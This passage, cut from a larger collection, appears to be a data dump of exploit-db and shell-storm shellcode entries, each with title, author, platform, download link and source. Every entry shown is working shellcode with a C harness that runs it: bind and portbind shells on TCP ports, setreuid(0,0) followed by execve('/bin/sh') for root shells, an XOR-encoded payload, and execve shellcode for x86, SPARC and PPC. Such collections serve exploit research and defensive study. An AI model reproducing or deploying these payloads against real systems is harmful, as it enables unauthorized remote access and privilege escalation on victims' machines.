"1\\xc0\\x31\\xc9\\xb1\\x09\\xf3\\xaa\\x8d\\x5e\\x08\\x89\\x5e\\x10\\x8d\\x4e\\x10\\x51\\x53\\x50\\x", "b0\\x3b\\xcd\\x80\\xb0\\x01\\xcd\\x80\\xe8\\x93\\xff\\xff\\xff\\x41\\x42\\x43\\x43\\x7f\\x00\\x00\\", "x01\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\";\t\t\t\t    ^", "\t\t\t\t\t\t             Start of IP addr", "void main() {", "        int *ret;", "", "        ret = (int *)&ret + 2;", "        (*ret) = (int)shellcode;", "}", "", "", "", "# milw0rm.com [2000-11-19]"]},
{"Title": "Solaris/SPARC - Bind (/TCP) Shell Shellcode (240 bytes)", "Author": "dopesquad.net", "Published": ": 2000-11-19", "Platform": "Solaris_SPARC", "Download": "https://old.exploit-db.com/download/13497.c", "View": "https://old.exploit-db.com/raw/13497/", "code": ["/*", "", "  Solaris - Sparc -> www.dopesquad.net", "", "*/", "", "char shellcode[] =", "  \"\\xa0\\x23\\xa0\\x10\"\t/* sub    \t%sp, 16, %l0 */", "  \"\\xae\\x23\\x80\\x10\"\t/* sub    \t%sp, %l0, %l7 */", "  \"\\xee\\x23\\xbf\\xec\"\t/* st     \t%l7, [%sp - 20] */", "  \"\\x82\\x05\\xe0\\xd6\"\t/* add    \t%l7, 214, %g1 */", "  \"\\x90\\x25\\xe0\\x0e\"\t/* sub    \t%l7, 14, %o0 */", "  \"\\x92\\x25\\xe0\\x0e\"\t/* sub    \t%l7, 14, %o1 */", "  \"\\x94\\x1c\\x40\\x11\"\t/* xor    \t%l1, %l1, %o2 */", "  \"\\x96\\x1c\\x40\\x11\"\t/* xor    \t%l1, %l1, %o3 */", "  \"\\x98\\x25\\xe0\\x0f\"\t/* sub    \t%l7, 15, %o4 */", "  \"\\x91\\xd0\\x38\\x08\"\t/* ta     \t0x8 */", "  \"\\xa4\\x1a\\x80\\x08\"\t/* xor    \t%o2, %o0, %l2 */", "  \"\\xd2\\x33\\xbf\\xf0\"\t/* sth    \t%o1, [%sp - 16] */", "  \"\\xac\\x10\\x27\\xd1\"\t/* mov    \t2001, %l6 */", "  \"\\xec\\x33\\xbf\\xf2\"\t/* sth    \t%l6, [%sp - 14] */", "  \"\\xc0\\x23\\xbf\\xf4\"\t/* st     \t%g0, [%sp - 12] */", "  \"\\x82\\x05\\xe0\\xd8\"\t/* add    \t%l7, 216, %g1 */", "  \"\\x90\\x1a\\xc0\\x12\"\t/* xor    \t%o3, %l2, %o0 */", "  \"\\x92\\x1a\\xc0\\x10\"\t/* xor    \t%o3, %l0, %o1 */", "  \"\\x94\\x1a\\xc0\\x17\"\t/* xor    \t%o3, %l7, %o2 */", "  \"\\x91\\xd0\\x38\\x08\"\t/* ta     \t0x8 */", "  \"\\x82\\x05\\xe0\\xd9\"\t/* add    \t%l7, 217, %g1 */", "  \"\\x90\\x1a\\xc0\\x12\"\t/* xor    \t%o3, %l2, %o0 */", "  \"\\x92\\x25\\xe0\\x0b\"\t/* sub    \t%l7, 11, %o1 */", "  \"\\x91\\xd0\\x38\\x08\"\t/* ta     \t0x8 */", "  \"\\x82\\x05\\xe0\\xda\"\t/* add    \t%l7, 218, %g1 */", "  \"\\x90\\x1a\\xc0\\x12\"\t/* xor    \t%o3, %l2, %o0 */", "  \"\\x92\\x1a\\xc0\\x10\"\t/* xor    \t%o3, %l0, %o1 */", "  \"\\x94\\x23\\xa0\\x14\"\t/* sub    \t%sp, 20, %o2 */", "  \"\\x91\\xd0\\x38\\x08\"\t/* ta     \t0x8 */", "  \"\\xa6\\x1a\\xc0\\x08\"\t/* xor    \t%o3, %o0, %l3 */", "  \"\\x82\\x05\\xe0\\x2e\"\t/* add    \t%l7, 46, %g1 */", "  \"\\x90\\x1a\\xc0\\x13\"\t/* xor    \t%o3, %l3, %o0 */", "  \"\\x92\\x25\\xe0\\x07\"\t/* sub    \t%l7, 7, %o1 */", "  \"\\x94\\x1b\\x80\\x0e\"\t/* xor    \t%sp, %sp, %o2 */", "  \"\\x91\\xd0\\x38\\x08\"\t/* ta     \t0x8 */", "  \"\\x90\\x1a\\xc0\\x13\"\t/* xor    \t%o3, %l3, %o0 */", "  \"\\x92\\x25\\xe0\\x07\"\t/* sub    \t%l7, 7, %o1 */", "  \"\\x94\\x02\\xe0\\x01\"\t/* add    \t%o3, 1, %o2 */", "  \"\\x91\\xd0\\x38\\x08\"\t/* ta     \t0x8 */", "  \"\\x90\\x1a\\xc0\\x13\"\t/* xor    \t%o3, %l3, %o0 */", "  \"\\x92\\x25\\xe0\\x07\"\t/* sub    \t%l7, 7, %o1 */", "  \"\\x94\\x02\\xe0\\x02\"\t/* add    \t%o3, 2, %o2 */", "  \"\\x91\\xd0\\x38\\x08\"\t/* ta     \t0x8 */", "  \"\\x90\\x1b\\x80\\x0e\"\t/* xor    \t%sp, %sp, %o0 */", "  \"\\x82\\x02\\xe0\\x17\"\t/* add    \t%o3, 23, %g1 */", "  \"\\x91\\xd0\\x38\\x08\"\t/* ta     \t0x8 */", "  \"\\x21\\x0b\\xd8\\x9a\"\t/* sethi  \t%hi(0x2f626800), %l0 */", "  \"\\xa0\\x14\\x21\\x6e\"\t/* or     \t%l0, 0x16e, %l0\t! 0x2f62696e */", "  \"\\x23\\x0b\\xdc\\xda\"\t/* sethi  \t%hi(0x2f736800), %l1 */", "  \"\\x90\\x23\\xa0\\x10\"\t/* sub    \t%sp, 16, %o0 */", "  \"\\x92\\x23\\xa0\\x08\"\t/* sub    \t%sp, 8, %o1 */", "  \"\\x94\\x1b\\x80\\x0e\"\t/* xor    \t%sp, %sp, %o2 */", "  \"\\xe0\\x3b\\xbf\\xf0\"\t/* std    \t%l0, [%sp - 16] */", "  \"\\xd0\\x23\\xbf\\xf8\"\t/* st     \t%o0, [%sp - 8] */", "  \"\\xc0\\x23\\xbf\\xfc\"\t/* st     \t%g0, [%sp - 4] */", "  \"\\x82\\x02\\xe0\\x3b\"\t/* add    \t%o3, 59, %g1 */", "  \"\\x91\\xd0\\x38\\x08\"\t/* ta     \t0x8 */", "  \"\\x90\\x1b\\x80\\x0e\"\t/* xor    \t%sp, %sp, %o0 */", "  \"\\x82\\x02\\xe0\\x01\"\t/* add    \t%o3, 1, %g1 */", "  \"\\x91\\xd0\\x38\\x08\"\t/* ta     \t0x8 */", ";", "", "", "", "# milw0rm.com [2000-11-19]"]},
{"Title": "Linux/x86 - Audio (knock knock knock) via /dev/dsp + setreuid(0,0) + execve() Shellcode (566 bytes)", "Author": "Cody Tubbs", "Published": ": 2000-12-20", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-541.php", "View": null, "code": [" /*", "  * Audio (knock knock knock) via /dev/dsp + setreuid(0,0) + execve shellcode. ", "(Linux x86)", "  * Author: Cody Tubbs (loophole of hhp).", "  * www.hhp-programming.net / pigspigs@yahoo.com", "  * 12/20/2000.", "  *", "  * F.U. to ph1x(ry4n). -From me and dxmd...", "  * [If I ripped this, show me the source... or better yet", "  *  go barrow a shovel so you can dig up deeper shit.]", "  */", "", "unsigned char hhpcode[] =", "\"\\xeb\\x03\\x5e\\xeb\\x05\\xe8\\xf8\\xff\\xff\\xff\\x83\\xc6\\x0f\\x31\\xc9\\x66\"", "\"\\xb9\\x1c\\x02\\x80\\x36\\x03\\x46\\xe2\\xfa\\xea\\xb8\\x03\\x03\\x03\\x2c\\x61\"", "\"\\x6a\\x6d\\x2c\\x70\\x6b\\x03\\x7d\\x03\\x93\\x93\\x93\\x93\\x93\\x93\\x93\\x93\"", "\"\\x93\\x93\\x93\\x93\\x93\\x93\\x93\\x93\\x93\\x7f\\x79\\x75\\x76\\x76\\x77\\x72\"", "\"\\x6e\\x69\\x68\\x6d\\x70\\x76\\x76\\x72\\x6e\\x69\\x64\\x65\\x60\\x63\\x5e\\x58\"", "\"\\x58\\x5e\\x5d\\x5d\\x5e\\x5c\\x61\\x64\\x6e\\x70\\x78\\xa5\\xaf\\xb1\\xb5\\xbf\"", "\"\\xbc\\xc0\\xc6\\xc6\\xc1\\xc2\\xbd\\xbe\\xb9\\xbb\\xb6\\xac\\xaa\\xa0\\x6d\\x6f\"", "\"\\x66\\x6a\\x69\\x64\\x55\\x26\\x33\\x4d\\x54\\x5d\\x43\\x38\\x35\\x46\\x40\\x63\"", "\"\\x60\\x61\\x55\\x48\\x49\\x4d\\x5d\\x66\\x6e\\x6a\\x64\\x63\\x59\\x54\\x63\\x69\"", "\"\\x6f\\x70\\x7a\\x7b\\x77\\x7b\\x79\\x75\\x71\\x6d\\x72\\x72\\x70\\x71\\x72\\x6d\"", "\"\\x72\\x70\\x70\\x70\\x79\\x76\\x6c\\x6d\\x6f\\x6e\\x68\\x70\\x75\\x6e\\x65\\x65\"", "\"\\x69\\x68\\x72\\x75\\x7d\\x7f\\x7e\\x7d\\x7f\\x79\\x78\\x78\\x7e\\x79\\x7e\\x7d\"", "\"\\x7f\\x74\\x75\\x77\\x70\\x75\\x79\\x7f\\x78\\x7a\\x75\\x71\\x73\\x72\\x09\\x03\"", "\"\\x2c\\x67\\x66\\x75\\x2c\\x67\\x70\\x73\\x03\\x82\\xef\\x64\\x28\\x03\\x03\\x8a\"", "\"\\xf5\\x56\\x8a\\xe6\\x80\\xef\\x1f\\x54\\x55\\x50\\xeb\\x03\\x03\\x03\\x03\\x58\"", "\"\\x82\\xc0\\xb9\\x12\\x03\\x03\\xc4\\x46\\xfb\\x03\\x03\\x03\\x03\\xc4\\x46\\xff\"", "\"\\x03\\x03\\x03\\x03\\x8e\\x80\\x76\\xee\\xfc\\xfc\\x8a\\x46\\xfb\\x8e\\xb8\\x7e\"", "\"\\xee\\xfc\\xfc\\x8e\\x90\\x93\\xee\\xfc\\xfc\\x8a\\x56\\xeb\\x8e\\x88\\x24\\xed\"", "\"\\xfc\\xfc\\x8a\\xcd\\xbb\\x06\\x03\\x03\\x03\\xba\\x02\\x03\\x03\\x03\\xb9\\x83\"", "\"\\x02\\x03\\x03\\x50\\x8a\\xf0\\xce\\x83\\x8a\\x46\\xf7\\xbb\\x2a\\x03\\x03\\x03\"", "\"\\x88\\x76\\xf7\\x50\\x8a\\xf0\\xce\\x83\\x8a\\x46\\xe7\\xbb\\x07\\x03\\x03\\x03\"", "\"\\x88\\x76\\xe7\\x88\\x4e\\xeb\\xb9\\x95\\x03\\x03\\x03\\x50\\x8a\\xf0\\xce\\x83\"", "\"\\xbb\\x07\\x03\\x03\\x03\\x50\\x8a\\xf0\\xce\\x83\\xc4\\x46\\xf3\\x03\\x03\\x03\"", "\"\\x03\\xbb\\x07\\x03\\x03\\x03\\x88\\x76\\xe7\\x8a\\xfa\\xb9\\x02\\x03\\x03\\x03\"", "\"\\x50\\x8a\\xf0\\xce\\x83\\xfc\\x46\\xf3\\x82\\x7e\\xf3\\x54\\x01\\x03\\x03\\x7d\"", "\"\\xe3\\xbb\\x07\\x03\\x03\\x03\\x88\\x4e\\xeb\\xb9\\x95\\x03\\x03\\x03\\x50\\x8a\"", "\"\\xf0\\xce\\x83\\xbb\\x07\\x03\\x03\\x03\\x50\\x8a\\xf0\\xce\\x83\\xc4\\x46\\xf3\"", "\"\\x03\\x03\\x03\\x03\\x93\\xbb\\x07\\x03\\x03\\x03\\x88\\x76\\xe7\\x8a\\xfa\\xb9\"", "\"\\x02\\x03\\x03\\x03\\x50\\x8a\\xf0\\xce\\x83\\xfc\\x46\\xf3\\x82\\x7e\\xf3\\x54\"", "\"\\x01\\x03\\x03\\x7d\\xe3\\xbb\\x07\\x03\\x03\\x03\\x88\\x4e\\xeb\\xb9\\x95\\x03\"", "\"\\x03\\x03\\x50\\x8a\\xf0\\xce\\x83\\xbb\\x07\\x03\\x03\\x03\\x50\\x8a\\xf0\\xce\"", "\"\\x83\\xbb\\x05\\x03\\x03\\x03\\x50\\x8a\\xf0\\xce\\x83\\xbb\\x05\\x03\\x03\\x03\"", "\"\\x88\\x76\\xf7\\x50\\x8a\\xf0\\xce\\x83\\xbb\\x45\\x03\\x03\\x03\\x32\\xf5\\x32\"", "\"\\xca\\x50\\x8a\\xf0\\xce\\x83\\x8e\\x7e\\xfb\\xbb\\x08\\x03\\x03\\x03\\x88\\x76\"", "\"\\xfb\\x8a\\xfa\\x32\\xd1\\x50\\x8a\\xf0\\xce\\x83\\x32\\xc3\\x8e\\x66\\xdb\\x58\"", "\"\\x5d\\x5c\\xca\\xc0\\x93\\x69\";", "", "typedef void (*F)(); ", "main(){F a;a=(F)(&hhpcode);a();}"]},
{"Title": "Linux/x86 - setreuid(0,0) + execve(/bin/sh) Shellcode (46+ bytes)", "Author": "Marco Ivaldi", "Published": ": 2001-05-07", "Platform": "Linux_x86", "Download": "https://old.exploit-db.com/download/13458.c", "View": "https://old.exploit-db.com/raw/13458/", "code": ["/*", " * $Id: execve-setreuid.c,v 1.1 2001/05/02 18:10:52 raptor Exp $", " *", " * execve-setreuid.c v1.0 - shellcode for Linux/i386", " * Copyright (c) 2001 Raptor <raptor@0xdeadbeef.eu.org>", " *", " * This shellcode does an execve of /bin/sh", " * after a setreuid(0, 0), then exit()s.", " *", " */", "/* * * * * * * * * * * * * * * * * * * * * * * * * * * * *", " * ASM Code                                              *", " * * * * * * * * * * * * * * * * * * * * * * * * * * * * *", " * ; setreuid(0, 0)", " * xorl %eax,%eax", " * xorl %ebx,%ebx", " * xorl %ecx,%ecx", " * movb $70,%al", " * int $0x80", " *", " * ; execve(foo[0], foo, 0);", " * jmp 0x1d", " * popl %esi", " * movb %eax,0x7(%esi)", " * movl %eax,0xc(%esi)", " * movl %esi,0x8(%esi)", " * movl %esi,%ebx", " * leal 0x8(%esi),%ecx", " * leal 0xc(%esi),%edx", " * movb $11,%al", " * int $0x80", " *", " * ; exit(0)", " * xorl %eax,%eax", " * xorl %ebx,%ebx", " * incl %eax", " * int $0x80", " *", " * call -0x22", " * .ascii \"/bin/sh\"", " * * * * * * * * * * * * * * * * * * * * * * * * * * * * */", "", "char code[] =", "  \"\\x31\\xc0\\x31\\xdb\\x31\\xc9\\xb0\\x46\\xcd\\x80\\xeb\\x1d\"", "  \"\\x5e\\x88\\x46\\x07\\x89\\x46\\x0c\\x89\\x76\\x08\\x89\\xf3\"", "  \"\\x8d\\x4e\\x08\\x8d\\x56\\x0c\\xb0\\x0b\\xcd\\x80\\x31\\xc0\"", "  \"\\x31\\xdb\\x40\\xcd\\x80\\xe8\\xde\\xff\\xff\\xff/bin/sh\";", "", "main()", "{", "  int (*funct)();", "  funct = (int (*)()) code;", "  (int)(*funct)();", "}", "", "", "// milw0rm.com [2001-05-07]"]},
{"Title": "Linux/PPC - execve(/bin/sh) Shellcode (112 bytes)", "Author": "Palante", "Published": ": 2004-09-12", "Platform": "Linux_PPC", "Download": "http://shell-storm.org/shellcode/files/shellcode-89.php", "View": null, "code": ["/*", " *  Linux PPC shellcode", " *  execve() of /bin/sh by Palante", " */", "", "long shellcode[] = { /* Palante's linuxPPC shellcode w/ NULL*/", "  0x7CC63278, 0x2F867FFF, 0x41BC0054, 0x7C6802A6,", "  0xB0C3FFF9, 0xB0C3FFF1, 0x38867FF0, 0x38A67FF4,", "  0x38E67FF3, 0x7CA52278, 0x7CE72278, 0x7C853A14,", "  0x7CC419AE, 0x7C042A14, 0x7CE72850, 0x7C852A14,", "  0x7C63212E, 0x7C832214, 0x7CC5212E, 0x7CA52A78,", "  0x44FFFF02, 0x7CE03B78, 0x44FFFF02, 0x4BFFFFB1,", "  0x2F62696E, 0x2F73685A, 0xFFFFFFFF, 0xFFFFFFFF", "};", "", "", "void main()", "{", "  __asm__(\"b shellcode\");", "}", "", "/*              disassembly", "", "      .section \".text\"      # Palante's LinuxPPC shellcode", "      .align 2", "      .globl m", "      .type    m,@function", "  m:", "\txor  6,6,6            # r6 is 0", "\tcmpi  7,0,6,0x7FFF    # do meaningless compare", "      bc 13,28,L2           # conditional branch to L2 - CAUSES NULL BYTE", "  L1: mfspr 3,8\t          # address of /bin/sh into r3 (execve parameter)", "\t\t\t", "\tsth  6,-7(3)          # fix sc opcode", "\tsth  6,-15(3)         # fix sc opcode", "\t", "\taddi 4,6,0x7FF0", "\taddi 5,6,0x7FF4", "\taddi 7,6,0x7FF3", "\txor  5,5,4            #got 0x4 into r5", "\txor  7,7,4            #got 0x3 into r7", "", "\t", "\tadd  4,5,7            # r4 = 0x7", "\tstbx 6,4,3            # store null after /bin/sh", "", "\tadd  0,4,5            # this makes 11 which is the execve system call", "      sub  7,5,7            # r7 = 0x1 for exit system call\t", "", "      add  4,5,5            # r4 = 0x8", "      stwx 3,3,4            # and store pointer to /bin/sh at r3+0x8", "\tadd  4,3,4            # r4 = r3 + 0x8 (execve parameter)", "\tstwx 6,5,4            # store NULL pointer", "      xor 5,5,5             # NULL (execve parameter)", "      .long   0x44ffff02    # not quite an sc opcode", "\tor 0,7,7              # syscall 1 - exit", "      .long   0x44ffff02    # not quite an sc opcode", "", " L2:  bl L1                 # branch and link back to L1", "      .long 0x2F62696E      #/bin/shZ", "      .long 0x2F73685A", "      .long 0xffffffff      # this is where pointer to /bin/sh goes", "      .long 0xffffffff      # this is where null pointer goes", "", " .Lfe1:", "  .size    m,.Lfe1-m", "", "*/", "", "// milw0rm.com [2004-09-12]"]},
{"Title": "Linux/SPARC - Bind (8975/TCP) Shell + Null-Free Shellcode (284 bytes)", "Author": "killah", "Published": ": 2004-09-12", "Platform": "Linux_SPARC", "Download": "http://shell-storm.org/shellcode/files/shellcode-84.php", "View": null, "code": ["/*", " * 0-day portbind shellcode for all those Sun machines running linux..", " * Coded from scratch, so i take all the credits.", " * It simply binds a pretty shell in port 8975/tcp enjoy.", " * no nulls, no fork, no shit, couldn't be more optimized.", " * enjoy!.", " *", " * Arch   : Sparc", " * OS     : Linux", " * Task   : Portbind", " * Length : 284 Bytes", " *", " * Copyright 2002 killah @ hack . gr", " * All rights reserved.", " *", " */", "", "#define NAME \"Sparc Linux Portbind\"", "", "char portbind[]=", "  \"\\x9d\\xe3\\xbf\\x78\"\t//\tsave  %sp, -136, %sp", "  \"\\x90\\x10\\x20\\x02\"\t//\tmov  2, %o0", "  \"\\x92\\x10\\x20\\x01\"\t//\tmov  1, %o1", "  \"\\x94\\x22\\x80\\x0a\"\t//\tsub  %o2, %o2, %o2", "  \"\\xd0\\x23\\xa0\\x44\"\t//\tst  %o0, [ %sp + 0x44 ]", "  \"\\xd2\\x23\\xa0\\x48\"\t//\tst  %o1, [ %sp + 0x48 ]", "  \"\\xd4\\x23\\xa0\\x4c\"\t//\tst  %o2, [ %sp + 0x4c ]", "  \"\\x90\\x10\\x20\\x01\"\t//\tmov  1, %o0", "  \"\\x92\\x03\\xa0\\x44\"\t//\tadd  %sp, 0x44, %o1", "  \"\\x82\\x10\\x20\\xce\"\t//\tmov  0xce, %g1", "  \"\\x91\\xd0\\x20\\x10\"\t//\tta  0x10", "  \"\\xd0\\x27\\xbf\\xf4\"\t//\tst  %o0, [ %fp + -12 ]", "  \"\\x90\\x10\\x20\\x02\"\t//\tmov  2, %o0", "  \"\\xd0\\x37\\xbf\\xd8\"\t//\tsth  %o0, [ %fp + -40 ]", "  \"\\x13\\x08\\xc8\\xc8\"\t//\tsethi  %hi(0x23232000), %o1", "  \"\\x90\\x12\\x63\\x0f\"\t//\tor  %o1, 0x30f, %o0", "  \"\\xd0\\x37\\xbf\\xda\"\t//\tsth  %o0, [ %fp + -38 ]", "  \"\\xc0\\x27\\xbf\\xdc\"\t//\tclr  [ %fp + -36 ]", "  \"\\x92\\x07\\xbf\\xd8\"\t//\tadd  %fp, -40, %o1", "  \"\\xd0\\x07\\xbf\\xf4\"\t//\tld  [ %fp + -12 ], %o0", "  \"\\x94\\x10\\x20\\x10\"\t//\tmov  0x10, %o2", "  \"\\xd0\\x23\\xa0\\x44\"\t//\tst  %o0, [ %sp + 0x44 ]", "  \"\\xd2\\x23\\xa0\\x48\"\t//\tst  %o1, [ %sp + 0x48 ]", "  \"\\xd4\\x23\\xa0\\x4c\"\t//\tst  %o2, [ %sp + 0x4c ]", "  \"\\x90\\x10\\x20\\x02\"\t//\tmov  2, %o0", "  \"\\x92\\x03\\xa0\\x44\"\t//\tadd  %sp, 0x44, %o1", "  \"\\x82\\x10\\x20\\xce\"\t//\tmov  0xce, %g1", "  \"\\x91\\xd0\\x20\\x10\"\t//\tta  0x10", "  \"\\xd0\\x07\\xbf\\xf4\"\t//\tld  [ %fp + -12 ], %o0", "  \"\\x92\\x10\\x20\\x05\"\t//\tmov  5, %o1", "  \"\\xd0\\x23\\xa0\\x44\"\t//\tst  %o0, [ %sp + 0x44 ]", "  \"\\xd2\\x23\\xa0\\x48\"\t//\tst  %o1, [ %sp + 0x48 ]", "  \"\\x90\\x10\\x20\\x04\"\t//\tmov  4, %o0", "  \"\\x92\\x03\\xa0\\x44\"\t//\tadd  %sp, 0x44, %o1", "  \"\\x82\\x10\\x20\\xce\"\t//\tmov  0xce, %g1", "  \"\\x91\\xd0\\x20\\x10\"\t//\tta  0x10", "  \"\\x92\\x07\\xbf\\xd8\"\t//\tadd  %fp, -40, %o1", "  \"\\x94\\x07\\xbf\\xec\"\t//\tadd  %fp, -20, %o2", "  \"\\xd0\\x07\\xbf\\xf4\"\t//\tld  [ %fp + -12 ], %o0", "  \"\\xd0\\x23\\xa0\\x44\"\t//\tst  %o0, [ %sp + 0x44 ]", "  \"\\xd2\\x23\\xa0\\x48\"\t//\tst  %o1, [ %sp + 0x48 ]", "  \"\\xd4\\x23\\xa0\\x4c\"\t//\tst  %o2, [ %sp + 0x4c ]", "  \"\\x90\\x10\\x20\\x05\"\t//\tmov  5, %o0", "  \"\\x92\\x03\\xa0\\x44\"\t//\tadd  %sp, 0x44, %o1", "  \"\\x82\\x10\\x20\\xce\"\t//\tmov  0xce, %g1", "  \"\\x91\\xd0\\x20\\x10\"\t//\tta  0x10", "  \"\\xd0\\x27\\xbf\\xf0\"\t//\tst  %o0, [ %fp + -16 ]", "  \"\\xd0\\x07\\xbf\\xf0\"\t//\tld  [ %fp + -16 ], %o0", "  \"\\x92\\x22\\x40\\x09\"\t//\tsub  %o1, %o1, %o1", "  \"\\x82\\x10\\x20\\x5a\"\t//\tmov  0x5a, %g1", "  \"\\x91\\xd0\\x20\\x10\"\t//\tta  0x10", "  \"\\xd0\\x07\\xbf\\xf0\"\t//\tld  [ %fp + -16 ], %o0", "  \"\\x92\\x10\\x20\\x01\"\t//\tmov  1, %o1", "  \"\\x82\\x10\\x20\\x5a\"\t//\tmov  0x5a, %g1", "  \"\\x91\\xd0\\x20\\x10\"\t//\tta  0x10", "  \"\\xd0\\x07\\xbf\\xf0\"\t//\tld  [ %fp + -16 ], %o0", "  \"\\x92\\x10\\x20\\x02\"\t//\tmov  2, %o1", "  \"\\x82\\x10\\x20\\x5a\"\t//\tmov  0x5a, %g1", "  \"\\x91\\xd0\\x20\\x10\"\t//\tta  0x10", "  \"\\x2d\\x0b\\xd8\\x9a\"\t//\tsethi  %hi(0x2f626800), %l6", "  \"\\xac\\x15\\xa1\\x6e\"\t//\tor  %l6, 0x16e, %l6", "  \"\\x2f\\x0b\\xdc\\xda\"\t//\tsethi  %hi(0x2f736800), %l7", "  \"\\x90\\x0b\\x80\\x0e\"\t//\tand  %sp, %sp, %o0", "  \"\\x92\\x03\\xa0\\x08\"\t//\tadd  %sp, 8, %o1", "  \"\\x94\\x22\\x80\\x0a\"\t//\tsub  %o2, %o2, %o2", "  \"\\x9c\\x03\\xa0\\x10\"\t//\tadd  %sp, 0x10, %sp", "  \"\\xec\\x3b\\xbf\\xf0\"\t//\tstd  %l6, [ %sp + -16 ]", "  \"\\xd0\\x23\\xbf\\xf8\"\t//\tst  %o0, [ %sp + -8 ]", "  \"\\xc0\\x23\\xbf\\xfc\"\t//\tclr  [ %sp + -4 ]", "  \"\\x82\\x10\\x20\\x3b\"\t//\tmov  0x3b, %g1", "  \"\\x91\\xd0\\x20\\x10\";\t//\tta  0x10", "", "int", "main() // test that techno-devil!", "{", "  int (*funct)();", "  funct = (int (*)()) portbind;", "  printf(\"%s shellcode\\n\\tSize = %d\\n\",NAME,strlen(portbind));", "  (int)(*funct)();", "  exit(0);", "}", "", "", "/* EOF */", "", "// milw0rm.com [2004-09-12]"]},
{"Title": "Linux/x86 - execve(/bin/sh) Shellcode (29 bytes)", "Author": "Matias Sedalo", "Published": ": 2004-09-12", "Platform": "Linux_x86", "Download": "https://old.exploit-db.com/download/13443.c", "View": "https://old.exploit-db.com/raw/13443/", "code": ["/* ", "  (c)1999-2003 Shellcode Research ", "      http://www.shellcode.com.ar", "", "   execve(/bin/sh) for linux x86", "   29 bytes", "   by Matias Sedalo", "", "        xorl    %ebx, %ebx", "        pushl   %ebx", "        leal    0x17(%ebx),%eax", "        int     $0x80", "        cdq", "        pushl   $0x68732f6e", "        pushl   $0x69622f2f", "        movl    %esp, %ebx", "        pushl   %eax", "        pushl   %ebx", "        movl    %esp, %ecx", "        movb    $0xb, %al", "        int     $0x80", "*/", "", "", "char shellcode[] =", "\"\\x31\\xdb\\x53\\x8d\\x43\\x17\\xcd\\x80\\x99\\x68\\x6e\\x2f\\x73\\x68\\x68\"", "\"\\x2f\\x2f\\x62\\x69\\x89\\xe3\\x50\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\";", "", "main() ", "{", "        int *ret;", "        ret=(int *)&ret +2;", "        printf(\"Shellcode lenght=%d\\n\",strlen(shellcode));", "        (*ret) = (int)shellcode;", "}", "", "// milw0rm.com [2004-09-12]"]},
{"Title": "Linux/x86 - execve(/bin/sh) Shellcode (24 bytes) (3)", "Author": "Matias Sedalo", "Published": ": 2004-09-12", "Platform": "Linux_x86", "Download": "https://old.exploit-db.com/download/13444.c", "View": "https://old.exploit-db.com/raw/13444/", "code": ["/* ", " * s0t4ipv6@shellcode.com.ar", " * ", " * execve(/bin/sh).", " *", " * 24 bytes. es lo mas chica que se puede hacer.", " *", "*/", "char shellcode[]=", "\"\\x31\\xc0\"                      // xorl         %eax,%eax", "\"\\x50\"                          // pushl        %eax", "\"\\x68\\x6e\\x2f\\x73\\x68\"          // pushl        $0x68732f6e", "\"\\x68\\x2f\\x2f\\x62\\x69\"          // pushl        $0x69622f2f", "\"\\x89\\xe3\"                      // movl         %esp,%ebx", "\"\\x99\"                          // cltd", "\"\\x52\"                          // pushl        %edx", "\"\\x53\"                          // pushl        %ebx", "\"\\x89\\xe1\"                      // movl         %esp,%ecx", "\"\\xb0\\x0b\"                      // movb         $0xb,%al", "\"\\xcd\\x80\"                      // int          $0x80", ";", "", "main() {", "        int *ret;", "        ret=(int *)&ret+2;", "        printf(\"Shellcode lenght=%d\\n\",strlen(shellcode));", "        (*ret) = (int)shellcode;", "}", "", "// milw0rm.com [2004-09-12]"]},
{"Title": "Linux/x86 - execve(/bin/sh) Shellcode (38 bytes)", "Author": "Matias Sedalo", "Published": ": 2004-09-12", "Platform": "Linux_x86", "Download": "https://old.exploit-db.com/download/13445.c", "View": "https://old.exploit-db.com/raw/13445/", "code": ["/*", " * s0t4ipv6@Shellcode.com.ar", " * execve /bin/sh", " *", " * main() {", " *  char *name[2];", " *  name[0]=\"/bin/sh\";", " *  name[1]=NULL;", " *  execve(name[0],name,NULL);", " * }", "*/", "", "#include <stdio.h>", "", "char shellcode[]=", "\"\\xeb\\x18\"\t\t//\tjmp\t0x18\t\t// 3-4", "\"\\x5e\"\t\t\t//\tpopl\t%esi\t\t// 5", "\"\\x89\\x76\\x08\"\t\t//\tmovl\t%esi, 0x8(%esi)\t// 6-8", "\"\\x31\\xc0\"\t\t//\txorl\t%eax, %eax\t// 9-10", "\"\\x88\\x46\\x07\"\t\t//\tmovb\t%al, 0x7(%esi)  // 11-13", "\"\\x89\\x46\\x0c\"\t\t//\tmovl\t%eax, 0xc(%esi)\t// 14-16  ", "\"\\x89\\xf3\"\t\t//\tmovl\t%esi, %ebx\t// 17-18", "\"\\x8d\\x4e\\x08\"\t\t//\tleal\t0x8(%esi), %ecx\t// 19-21", "\"\\x8d\\x56\\x0c\"\t\t//\tleal\t0xc(%esi), %edx\t// 22-24", "\"\\xb0\\x0b\"\t\t//\tmovb\t$0xb, %al\t// 25-20 0xb to eax (syscall execve)6", "\"\\xcd\\x80\"\t\t//\tint\t$0x80\t\t// 27-28", "\"\\xe8\\xe3\\xff\\xff\\xff\"\t//\tcall\t-0x1d", "\"/bin/sh\";", "", "main() {", "\tint *ret;", "\tret=(int *)&ret +2;", "\tprintf(\"Shellcode lenght=%d\\n\",strlen(shellcode));", "\t(*ret) = (int)shellcode;", "}", "", "// milw0rm.com [2004-09-12]"]},
{"Title": "Linux/x86 - execve(/bin/sh) Shellcode (30 bytes)", "Author": "Matias Sedalo", "Published": ": 2004-09-12", "Platform": "Linux_x86", "Download": "https://old.exploit-db.com/download/13446.c", "View": "https://old.exploit-db.com/raw/13446/", "code": ["/*", "s0t4ipv6@shellcode.com.ar", "20 de marzo de 2001", "", "", "\"\\x31\\xdb\"                      // xorl         %ebx,%ebx", "\"\\x8d\\x43\\x17\"                  // leal         0x17(%ebx),%eax", "\"\\xcd\\x80\"                      // int          $0x80", "\"\\x31\\xd2\"                      // xorl         %edx,%edx", "\"\\x52\"                          // pushl        %edx", "\"\\x68\\x6e\\x2f\\x73\\x68\"          // pushl        $0x68732f6e", "\"\\x68\\x2f\\x2f\\x62\\x69\"          // pushl        $0x69622f2f", "\"\\x89\\xe3\"                      // movl         %esp,%ebx", "\"\\x52\"                          // pushl        %edx", "\"\\x53\"                          // pushl        %ebx", "\"\\x89\\xe1\"                      // movl         %esp,%ecx", "\"\\xb0\\x0b\"                      // movb         $0xb,%al", "\"\\xcd\\x80\";                